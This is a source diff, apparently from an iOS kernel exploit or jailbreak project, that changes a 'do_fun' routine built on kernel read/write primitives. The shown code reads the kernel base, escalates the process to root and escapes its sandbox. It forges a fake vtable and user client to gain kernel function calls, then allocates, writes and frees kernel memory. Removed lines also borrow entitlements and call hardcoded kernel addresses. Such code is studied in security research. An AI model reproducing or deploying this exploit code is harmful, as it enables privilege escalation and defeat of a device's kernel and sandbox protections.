@@ -412,9 +412,24 @@ uint64_t findRootVnode(void) {
     return root_vnode;
 }
 
+int save_for_kcall(uint64_t fake_vtable, uint64_t fake_client) {
+    NSDictionary *dictionary = @{
+        @"kcall_fake_vtable": @(fake_vtable),
+        @"kcall_fake_client": @(fake_client)
+    };
+    
+    BOOL success = [dictionary writeToFile:@"tmp/kfd-arm64.plist" atomically:YES];
+    if (!success) {
+        printf("[-] Failed createPlistAtPath.\n");
+        return -1;
+    }
+    
+    return 0;
+}
+
 
 int do_fun(void) {
-//    _offsets_init();
+    _offsets_init();
     
     uint64_t kslide = get_kslide();
     uint64_t kbase = 0xfffffff007004000 + kslide;
@@ -424,77 +439,41 @@ int do_fun(void) {
     uint64_t kheader64 = kread64(kbase);
     printf("[i] Kernel base kread64 ret: 0x%llx\n", kheader64);
     
-    return 0;
-    
     printf("[i] rootify ret: %d\n", rootify(getpid()));
     printf("[i] uid: %d, gid: %d\n", getuid(), getgid());
     
-    uint64_t sb = unsandbox(getpid());
-        printf("[i] our_sandbox: 0x%llx\n", sb);
-    
-    const char* superEnts = [NSString stringWithFormat:@"%@/superEnts", NSBundle.mainBundle.bundlePath].UTF8String;
-    chmod(superEnts, 0755);
-    uint64_t self_amfi = run_borrow_entitlements(getpid(), superEnts);
-    
-//    uint64_t our_sandbox = unsandbox(getpid());
-//    printf("[i] our_sandbox: 0x%llx\n", our_sandbox);
-    
-//    set_task_platform(getpid(), YES);
-//    set_proc_csflags(getpid());
-//    set_csb_platform_binary(getpid());
-    
-//    takeover_amfid();
-
-//    kcall(proc_set_ucred_func, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
-    init_kcall();
-    
-//    uint64_t retVal = kcall(0xFFFFFFF00758EE74 + kslide, 1, 0, 0, 0, 0, 0, 0);
-    uint64_t retVal = kcall(0xFFFFFFF00733DEC0 + kslide, 1, 0, 0, 0, 0, 0, 0);
-    printf("retVal: 0x%llx\n", retVal);
-    printf("retVal: 0x%llx\n", ZmFixAddr(retVal));
-    printf("[+] rootvnode: 0x%llx\n", findRootVnode());
-//    printf("retVal: %p\n", retVal);
-//    printf("retVal: 0x%llx\n", &retVal);
-    
-//    printf("retVal: 0x%llx\n", (uint64_t *)retVal);
-    
-    kill_unborrow_entitlements(getpid(), self_amfi, pid_by_name("superEnts"));
-    printf("sandbox ret: %d\n", sandbox(getpid(), sb));
-    return 0;
-
-//    const char* superEnts = [NSString stringWithFormat:@"%@/superEnts", NSBundle.mainBundle.bundlePath].UTF8String;
-//    chmod(superEnts, 0755);
-//    uint64_t self_amfi = run_borrow_entitlements(getpid(), superEnts);
-    
-    
-    
-    kill_unborrow_entitlements(getpid(), self_amfi, pid_by_name("superEnts"));
-    
-    
-    //cleanup
-//    printf("[i] sandbox ret: %d\n", sandbox(getpid(), our_sandbox));
-
-    
-    
-    
-    
-//    uint64_t rc_proc = proc_by_name("ReportCrash");
-//    pid_t rc_pid = pid_by_name("ReportCrash");
-//
-//    printf("rc_proc: 0x%llx, rc_pid: %d\n", rc_proc, rc_pid);
-    
 //    uint64_t sb = unsandbox(getpid());
-//    printf("sb: 0x%llx\n", sb);
-//
-//    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/mobile" error:NULL];
-//    NSLog(@"directory list: %@", dirs);
-//
-//    printf("sandbox ret: %d\n", sandbox(getpid(), sb));
-//
-//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/mobile" error:NULL];
-//    NSLog(@"directory list: %@", dirs);
+//    printf("[i] our_sandbox: 0x%llx\n", sb);
     
+    uint64_t fake_vtable, fake_client = 0;
+    if(access("/tmp/kfd-arm64.plist", F_OK) == 0) {
+        uint64_t sb = unsandbox(getpid());
+        NSDictionary *kcalltest14_dict = [NSDictionary dictionaryWithContentsOfFile:@"/tmp/kfd-arm64.plist"];
+        fake_vtable = [kcalltest14_dict[@"kcall_fake_vtable"] unsignedLongLongValue];
+        fake_client = [kcalltest14_dict[@"kcall_fake_client"] unsignedLongLongValue];
+        sandbox(getpid(), sb);
+    } else {
+        kalloc_using_empty_kdata_page(&fake_vtable, &fake_client);
+        
+        //Once if you successfully get kalloc to use fake_vtable and fake_client,
+        //DO NOT use dirty_kalloc again since unstable method.
+        uint64_t sb = unsandbox(getpid());
+        save_for_kcall(fake_vtable, fake_client);
+        sandbox(getpid(), sb);
+        printf("Saved fake_vtable, fake_client for kcall.\n");
+        printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", fake_vtable, fake_client);
+    }
     
+    mach_port_t user_client = 0;
+    init_kcall_allocated(fake_vtable, fake_client, &user_client);
+    
+    size_t allocated_size = 0x1000;
+    uint64_t allocated_kmem = kalloc(user_client, fake_client, allocated_size);
+    kwrite64(allocated_kmem, 0x4142434445464748);
+    printf("allocated_kmem: 0x%llx\n", allocated_kmem);
+    HexDump(allocated_kmem, allocated_size);
+    
+    kfree(user_client, fake_client, allocated_kmem, allocated_size);
     
     return 0;
 }
